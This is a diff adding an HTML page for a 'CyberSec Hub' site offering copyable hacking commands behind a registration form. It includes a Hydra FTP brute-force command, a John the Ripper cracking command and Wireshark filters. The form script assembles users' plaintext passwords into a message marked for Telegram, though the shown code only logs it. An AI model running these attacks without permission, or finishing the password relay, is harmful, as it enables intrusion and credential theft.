+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.7</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Code 4 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">04</span>
+                                </div>
+                                <h3 class="text-xl font-bold">John the Ripper</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text="john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt">
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <code class="text-cyan-400">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Password cracking with John using the rockyou wordlist against hashes in a file.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Password Cracking</span>
+                                <div class="flex items-center">
+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.6</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Code 5 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">05</span>
+                                </div>
+                                <h3 class="text-xl font-bold">Hydra FTP Brute Force</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text="hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target_ip">
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <code class="text-cyan-400">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target_ip</code>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Brute force FTP credentials using Hydra with the rockyou wordlist.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Brute Force</span>
+                                <div class="flex items-center">
+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.5</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Code 6 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">06</span>
+                                </div>
+                                <h3 class="text-xl font-bold">Wireshark Filter</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text='tcp.port == 80 || tcp.port == 443
+ip.src == 192.168.1.1
+http.request.method == "POST"'>
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <pre class="text-cyan-400"><code>tcp.port == 80 || tcp.port == 443
+ip.src == 192.168.1.1
+http.request.method == "POST"</code></pre>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Common Wireshark filters for analyzing web traffic and specific IP communications.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Network Analysis</span>
+                                <div class="flex items-center">
+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.8</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-12 text-center">
+                        <button class="btn-cyber px-6 py-3 rounded-md font-bold hacker-font">
+                            <i class="fas fa-arrow-down mr-2"></i> LOAD MORE CODES
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- About Section -->
+        <section id="about" class="py-16 px-4 sm:px-6 lg:px-8 bg-black bg-opacity-70 relative">
+            <div class="max-w-4xl mx-auto terminal p-8 rounded-lg cyber-border">
+                <h2 class="hacker-font text-2xl sm:text-3xl font-bold mb-6 text-center glow">ABOUT <span class="text-white">CYBERSEC HUB</span></h2>
+                <div class="space-y-6 text-cyan-300">
+                    <p>CyberSec Hub is the premier knowledge base for cybersecurity professionals and ethical hackers. Our mission is to provide comprehensive resources, tools, and techniques for securing digital systems and networks against evolving threats.</p>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
+                        <div>
+                            <h3 class="text-xl font-bold text-cyan-400 mb-4 flex items-center">
+                                <i class="fas fa-bullseye mr-3"></i> Our Mission
+                            </h3>
+                            <p>To empower security professionals with the knowledge and tools needed to protect digital assets while promoting ethical hacking practices and responsible disclosure.</p>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-bold text-cyan-400 mb-4 flex items-center">
+                                <i class="fas fa-eye mr-3"></i> Our Vision
+                            </h3>
+                            <p>A world where cybersecurity knowledge is accessible to all who need it, creating a safer digital environment for businesses and individuals alike.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-8">
+                        <h3 class="text-xl font-bold text-cyan-400 mb-4 flex items-center">
+                            <i class="fas fa-exclamation-triangle mr-3"></i> Legal Disclaimer
+                        </h3>
+                        <p>All information on this platform is intended for educational purposes and authorized penetration testing only. Unauthorized use of these techniques against systems you do not own or have permission to test is illegal.</p>
+                        <p class="mt-4">Remember: With great power comes great responsibility. Always obtain proper authorization before conducting any security testing.</p>
+                    </div>
+                    
+                    <div class="mt-12">
+                        <h3 class="text-xl font-bold text-cyan-400 mb-6 text-center">JOIN OUR COMMUNITY</h3>
+                        <div class="flex justify-center space-x-8">
+                            <a href="#" class="text-cyan-400 hover:text-cyan-300 text-3xl tooltip" data-tooltip="GitHub">
+                                <i class="fab fa-github"></i>
+                            </a>
+                            <a href="#" class="text-cyan-400 hover:text-cyan-300 text-3xl tooltip" data-tooltip="Twitter">
+                                <i class="fab fa-twitter"></i>
+                            </a>
+                            <a href="#" class="text-cyan-400 hover:text-cyan-300 text-3xl tooltip" data-tooltip="Discord">
+                                <i class="fab fa-discord"></i>
+                            </a>
+                            <a href="#" class="text-cyan-400 hover:text-cyan-300 text-3xl tooltip" data-tooltip="Telegram">
+                                <i class="fab fa-telegram"></i>
+                            </a>
+                            <a href="#" class="text-cyan-400 hover:text-cyan-300 text-3xl tooltip" data-tooltip="LinkedIn">
+                                <i class="fab fa-linkedin"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Newsletter Section -->
+        <section class="py-16 px-4 sm:px-6 lg:px-8">
+            <div class="max-w-2xl mx-auto terminal p-8 rounded-lg text-center cyber-border">
+                <h2 class="hacker-font text-2xl font-bold mb-4 glow">STAY UPDATED</h2>
+                <p class="text-cyan-300 mb-6">Subscribe to our newsletter for the latest cybersecurity updates, code releases, and exclusive content.</p>
+                
+                <form class="flex flex-col sm:flex-row gap-3">
+                    <input type="email" placeholder="Your email address" class="input-cyber flex-grow px-4 py-3 rounded-md" required>
+                    <button type="submit" class="btn-cyber px-6 py-3 rounded-md font-bold hacker-font whitespace-nowrap">
+                        <i class="fas fa-paper-plane mr-2"></i> SUBSCRIBE
+                    </button>
+                </form>
+                
+                <p class="text-xs text-cyan-400 mt-4">We respect your privacy. Unsubscribe at any time.</p>
+            </div>
+        </section>
+        
+        <!-- Footer -->
+        <footer class="py-8 px-4 sm:px-6 lg:px-8 border-t border-cyan-500 border-opacity-20 bg-black bg-opacity-80">
+            <div class="max-w-6xl mx-auto">
+                <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                    <div>
+                        <div class="flex items-center space-x-3 mb-4">
+                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center">
+                                <i class="fas fa-shield-halved text-cyan-500"></i>
+                            </div>
+                            <h3 class="hacker-font text-xl">CyberSecHub</h3>
+                        </div>
+                        <p class="text-cyan-300 text-sm">The ultimate cybersecurity knowledge base for ethical hackers and security professionals.</p>
+                    </div>
+                    
+                    <div>
+                        <h4 class="text-lg font-bold mb-4">Resources</h4>
+                        <ul class="space-y-2 text-sm text-cyan-300">
+                            <li><a href="#" class="hover:text-cyan-400 transition">Documentation</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Tutorials</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Blog</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Cheat Sheets</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div>
+                        <h4 class="text-lg font-bold mb-4">Community</h4>
+                        <ul class="space-y-2 text-sm text-cyan-300">
+                            <li><a href="#" class="hover:text-cyan-400 transition">Discord</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">GitHub</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Forums</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Events</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div>
+                        <h4 class="text-lg font-bold mb-4">Company</h4>
+                        <ul class="space-y-2 text-sm text-cyan-300">
+                            <li><a href="#" class="hover:text-cyan-400 transition">About Us</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Careers</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Contact</a></li>
+                            <li><a href="#" class="hover:text-cyan-400 transition">Legal</a></li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="border-t border-cyan-500 border-opacity-20 mt-8 pt-8 flex flex-col md:flex-row justify-between items-center">
+                    <div class="text-sm text-cyan-300 mb-4 md:mb-0">
+                        © 2023 CyberSecHub. All rights reserved.
+                    </div>
+                    <div class="flex space-x-6">
+                        <a href="#" class="text-sm text-cyan-300 hover:text-cyan-400 transition">Terms</a>
+                        <a href="#" class="text-sm text-cyan-300 hover:text-cyan-400 transition">Privacy</a>
+                        <a href="#" class="text-sm text-cyan-300 hover:text-cyan-400 transition">Cookies</a>
+                        <a href="#" class="text-sm text-cyan-300 hover:text-cyan-400 transition">Security</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+    <script>
+        // Matrix background animation
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const nums = '0123456789';
+        const symbols = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';
+        
+        const alphabet = katakana + latin + nums + symbols;
+        
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        
+        const rainDrops = [];
+        
+        for (let x = 0; x < columns; x++) {
+            rainDrops[x] = 1;
+        }
+        
+        const draw = () => {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#00f0ff';
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        };
+        
+        setInterval(draw, 30);
+        
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+        
+        // Mobile menu toggle
+        const mobileMenuButton = document.getElementById('mobileMenuButton');
+        const mobileMenu = document.getElementById('mobileMenu');
+        
+        mobileMenuButton.addEventListener('click', () => {
+            mobileMenu.classList.toggle('open');
+            mobileMenuButton.innerHTML = mobileMenu.classList.contains('open') ? 
+                '<i class="fas fa-times text-2xl"></i>' : 
+                '<i class="fas fa-bars text-2xl"></i>';
+        });
+        
+        // Tab functionality
+        const tabs = document.querySelectorAll('.tab');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+            });
+        });
+        
+        // Form submission
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            // Simple validation
+            if (password !== confirmPassword) {
+                showNotification('Passwords do not match!', 'error');
+                return;
+            }
+            
+            if (password.length < 8) {
+                showNotification('Password must be at least 8 characters long!', 'error');
+                return;
+            }
+            
+            if (!document.getElementById('terms').checked) {
+                showNotification('You must agree to the terms!', 'error');
+                return;
+            }
+            
+            // Prepare data for Telegram
+            const message = `New registration:\nName: ${firstName} ${lastName}\nEmail: ${email}\nPassword: ${password}`;
+            
+            // In a real application, you would send this to your backend
+            console.log('Registration data:', { firstName, lastName, email, password });
+            
+            // Show success message
+            document.getElementById('registrationForm').classList.add('hidden');
+            document.getElementById('successMessage').classList.remove('hidden');
+            
+            // Show all codes after a delay
+            setTimeout(() => {
+                document.getElementById('codesLocked').classList.add('hidden');
+                document.getElementById('codesContent').classList.remove('hidden');
+                
+                // Scroll to codes section
+                setTimeout(() => {
+                    document.querySelector('#codes').scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }, 500);
+            }, 3000);
+        });
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                // Close mobile menu if open
+                if (mobileMenu.classList.contains('open')) {
+                    mobileMenu.classList.remove('open');
+                    mobileMenuButton.innerHTML = '<i class="fas fa-bars text-2xl"></i>';
+                }
+                
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+        
+        // Copy to clipboard functionality
+        document.querySelectorAll('.copy-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                const text = this.getAttribute('data-clipboard-text') || 
+                             document.querySelector(this.getAttribute('data-clipboard-target')).innerText;
+                
+                navigator.clipboard.writeText(text.trim()).then(() => {
+                    showNotification('Code copied to clipboard!');
+                }).catch(err => {
+                    showNotification('Failed to copy text!', 'error');
+                    console.error('Could not copy text: ', err);
+                });
+            });
+        });
+        
+        // Notification function
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notificationText');
+            
+            notificationText.textContent = message;
+            
+            if (type === 'error') {
+                notification.classList.add('error');
+            } else {
+                notification.classList.remove('error');
+            }
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Add animation to code blocks when they come into view
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('floating');
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        document.querySelectorAll('.code-block').forEach(block => {
+            observer.observe(block);
+        });
+        
+        // Terminal header buttons functionality
+        document.querySelector('.terminal-btn.red').addEventListener('click', () => {
+            showNotification('Connection terminated', 'error');
+        });
+        
+        document.querySelector('.terminal-btn.yellow').addEventListener('click', () => {
+            showNotification('Terminal minimized', 'warning');
+        });
+        
+        document.querySelector('.terminal-btn.green').addEventListener('click', () => {
+            showNotification('Terminal maximized');
+        });
+    </script>
+</body>
+</html>
